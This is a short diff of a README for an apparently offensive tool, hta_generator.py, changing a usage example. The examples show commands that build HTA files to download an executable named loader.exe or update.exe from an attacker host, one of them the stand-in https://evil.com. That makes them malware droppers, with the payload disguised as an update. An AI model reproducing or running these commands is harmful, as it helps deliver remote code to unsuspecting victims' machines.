@@ -116,7 +116,7 @@ chmod +x hta_generator.py
 
 ```bash
 # Basic
-./hta_generator.py -m 1 -H YOUR_IP -f loader.exe -o download.hta
+./hta_generator.py -m 1 -H YOUR_IP/download/ -f loader.exe -o download.hta
 
 # With HTTPS
 ./hta_generator.py -m 1 -H https://evil.com -f update.exe
